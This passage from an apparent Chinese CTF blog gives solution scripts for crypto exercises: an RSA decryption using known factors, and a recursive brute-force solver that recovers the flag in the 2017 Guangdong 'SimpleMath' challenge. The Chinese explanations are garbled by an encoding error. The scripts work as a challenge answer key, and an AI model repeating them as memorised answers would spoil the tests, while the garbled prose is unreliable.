<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line">p=<span class="number">302825536744096741518546212761194311477</span></span><br><span class="line">q=<span class="number">325045504186436346209877301320131277983</span></span><br><span class="line">n=<span class="number">98432079271513130981267919056149161631892822707167177858831841699521774310891</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">d=int(gmpy2.invert(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>)))</span><br><span class="line"></span><br><span class="line">privatekey = rsa.PrivateKey(n,e,d,p,q)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"encrypted.message1"</span>,<span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    print(rsa.decrypt(f.read(),privatekey).decode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"encrypted.message2"</span>,<span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    print(rsa.decrypt(f.read(),privatekey).decode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"encrypted.message3"</span>,<span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    print(rsa.decrypt(f.read(),privatekey).decode())</span><br></pre></td></tr></table></figure>





<h2 id="2017ç¬¬äºŒå±Šå¹¿ä¸œçœå¼ºç½‘æ¯çº¿ä¸Šèµ›-SimpleMath"><a href="#2017ç¬¬äºŒå±Šå¹¿ä¸œçœå¼ºç½‘æ¯çº¿ä¸Šèµ›-SimpleMath" class="headerlink" title="2017ç¬¬äºŒå±Šå¹¿ä¸œçœå¼ºç½‘æ¯çº¿ä¸Šèµ›-SimpleMath"></a>2017ç¬¬äºŒå±Šå¹¿ä¸œçœå¼ºç½‘æ¯çº¿ä¸Šèµ›-SimpleMath</h2><p>é¢˜ç›®æºç å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">flag = <span class="string">"xxx"</span></span><br><span class="line"><span class="keyword">assert</span> len(flag) == <span class="number">15</span></span><br><span class="line">pad = bytes_to_long(md5(flag).digest())</span><br><span class="line"></span><br><span class="line">hack = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> flag:</span><br><span class="line">	hack *= ord(char)</span><br><span class="line">	hack += pad</span><br><span class="line">	</span><br><span class="line"><span class="keyword">print</span> hack</span><br><span class="line"><span class="comment"># hack = 280098481791453837177137197730537158171743673148935867304957882116</span></span><br><span class="line"><span class="comment"># flag = "flag&#123;" + flag + "&#125;"</span></span><br></pre></td></tr></table></figure>



<p>å®šä¹‰flagçš„é•¿åº¦ä¸º15ä½</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">assert</span> len(flag) == <span class="number">15</span></span><br></pre></td></tr></table></figure>



<p>å®šä¹‰padä¸ºmd5åŠ å¯†å€¼ï¼Œæ‰€ä»¥padçš„é•¿åº¦ä¸º32ä½ï¼Œé‚£ä¹ˆå…¶æ¯”ç‰¹ä½ä¸º120-128ä½</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pad = bytes_to_long(md5(flag).digest())</span><br></pre></td></tr></table></figure>



<p>åŠ å¯†è¿‡ç¨‹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> flag:</span><br><span class="line">	hack *= ord(char)</span><br><span class="line">	hack += pad</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªåŠ å¯†è¿‡ç¨‹å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">hack0=<span class="number">0</span></span><br><span class="line">hack1=hack0*f1+pad=pad</span><br><span class="line">hack2=hack1*f2+pad=pad*(f2+<span class="number">1</span>)</span><br><span class="line">hack3=hack2*f3+pad=pad*(f3*f2+f3+<span class="number">1</span>)</span><br><span class="line">hack4=hack3*f4+pad=pad*(f4*f3*f2+f4*f3+f4+<span class="number">1</span>)</span><br><span class="line">....</span><br><span class="line">....</span><br><span class="line">hack15=..=pad*(f15*..*f3*f2+f15*..*f4*f3+..+f15+<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>hack15å³æœ€åçš„åŠ å¯†ç»“æœ,hack15å¯ä»¥çœ‹åšæ˜¯padå’ŒæŸä¸ªæ•´æ•°çš„ç›¸ä¹˜ç»“æœï¼š</p>
<p>å½“æˆ‘ä»¬å°†hackè¿›è¡Œå› å¼åˆ†è§£ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span>,<span class="number">2</span>,<span class="number">19</span>,<span class="number">31</span>,<span class="number">59</span>,<span class="number">97</span>,<span class="number">127</span>,<span class="number">3727</span>,<span class="number">44948980991</span>,<span class="number">1753609692783577883</span>,<span class="number">556795634058750798159011</span></span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥padä¸ºè¿™12ä¸ªå› å­ä¸­æŸäº›ä¸ªå› å­çš„ç›¸ä¹˜ç»“æœï¼Œåˆç”±äºpadä¸ºmd5åŠ å¯†çš„ç»“æœã€‚æ‰€ä»¥å…¶æ¯”ç‰¹ä½120-128ä¹‹é—´ã€‚è¿™æ ·å­æˆ‘ä»¬å¯ä»¥çˆ†ç ´è·å¾—å‡ ä¸ªç¬¦åˆæ¡ä»¶çš„pad</p>
<p>ï¼Œæœ‰å¦‚ä¸‹ç­‰å¼ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hack/pad=f15*..*f3*f2+f15*..*f4*f3+..+f15+<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>æ•…è€Œæœ‰ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(hack/pad)<span class="number">-1</span>=f15*..*f3*f2+f15*..*f4*f3+..+f15</span><br></pre></td></tr></table></figure>

<p>ç”±äºf1è‡³f15ä¸ºå¯è§å­—ç¬¦ï¼Œæ‰€ä»¥å…¶asciiå€¼çš„å–å€¼ä¸º32-127ã€‚</p>
<p>è¿™ä¸ªç­‰å¼å°†ä¼šæ»¡è¶³ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[(hack/pad)<span class="number">-1</span>]%f15=<span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>ä»¥åŠ</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[[(hack/pad)<span class="number">-1</span>]/f15<span class="number">-1</span>]%f14=<span class="number">0</span></span><br><span class="line">[[[(hack/pad)<span class="number">-1</span>]/f15<span class="number">-1</span>]/f14<span class="number">-1</span>]%f13=<span class="number">0</span></span><br><span class="line">....</span><br></pre></td></tr></table></figure>



<p>è§£å¯†expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line">hack=<span class="number">280098481791453837177137197730537158171743673148935867304957882116</span></span><br><span class="line">dic=[<span class="number">2</span>,<span class="number">2</span>,<span class="number">19</span>,<span class="number">31</span>,<span class="number">59</span>,<span class="number">97</span>,<span class="number">127</span>,<span class="number">3727</span>,<span class="number">44948980991</span>,<span class="number">1753609692783577883</span>,<span class="number">556795634058750798159011</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">result1</span><span class="params">(arr)</span>:</span><span class="comment">#è·å¾—æ¯ä¸€ä¸ªç»„åˆç»“æœä¸­æ•°å­—çš„ç›¸ä¹˜ç»“æœ</span></span><br><span class="line">    source = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arr:</span><br><span class="line">        source *= i</span><br><span class="line">    <span class="keyword">return</span> source    </span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f2</span><span class="params">(a,b,s,n)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> a//b<span class="number">-1</span> <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        s = s+chr(a//b<span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">if</span> len(s)==<span class="number">14</span>:</span><br><span class="line">            checkMD5(s[::<span class="number">-1</span>],n)        </span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">if</span> (a//b<span class="number">-1</span>)%c==<span class="number">0</span>:</span><br><span class="line">            f2(a//b<span class="number">-1</span>,c,s+chr(c),n)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkMD5</span><span class="params">(s,n)</span>:</span></span><br><span class="line">     <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">         t= chr(c)+s</span><br><span class="line">         <span class="keyword">if</span> int.from_bytes(md5(t.encode(<span class="string">'utf-8'</span>)).digest(),byteorder=<span class="string">'big'</span>)==n:</span><br><span class="line">             print(t)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">12</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> list(itertools.combinations(dic,i)):<span class="comment">#å°†è¿™äº›æ•°å­—è¿›è¡Œç»„åˆ</span></span><br><span class="line">        tmp = result1(j)</span><br><span class="line">        <span class="keyword">if</span> tmp.bit_length() <span class="keyword">in</span> range(<span class="number">120</span>,<span class="number">129</span>):</span><br><span class="line">            f2(hack,tmp,<span class="string">''</span>,tmp)</span><br></pre></td></tr></table></figure>

<p>ç®—æ³•çš„ä¼˜åŠ¿åœ¨äºåˆç†åˆ©ç”¨äº†é€’å½’ç®—æ³•ã€‚</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/03/04/crypto-exercise/" data-id="ck8sqr5jk000skou577x37gt7" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/someting/" rel="tag">someting</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">ä»£ç å®¡è®¡</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/someting/" style="font-size: 10px;">someting</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">ä»£ç å®¡è®¡</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/04/09/MRCTF2020-web/">MRCTF2020-web</a>
          </li>
        
          <li>
            <a href="/2020/04/09/CVE-2020-1938/">CVE-2020-1938</a>
          </li>
        
          <li>
            <a href="/2020/04/09/CVE-2019-0232/">CVE-2019-0232</a>
          </li>
        
          <li>
            <a href="/2020/03/30/thinkphp5-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">thinkphp5.1ååºåˆ—åŒ–</a>
          </li>
        
          <li>
            <a href="/2020/03/20/BJDCTF-2nd/">BJDCTF-2nd</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 John Doe<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>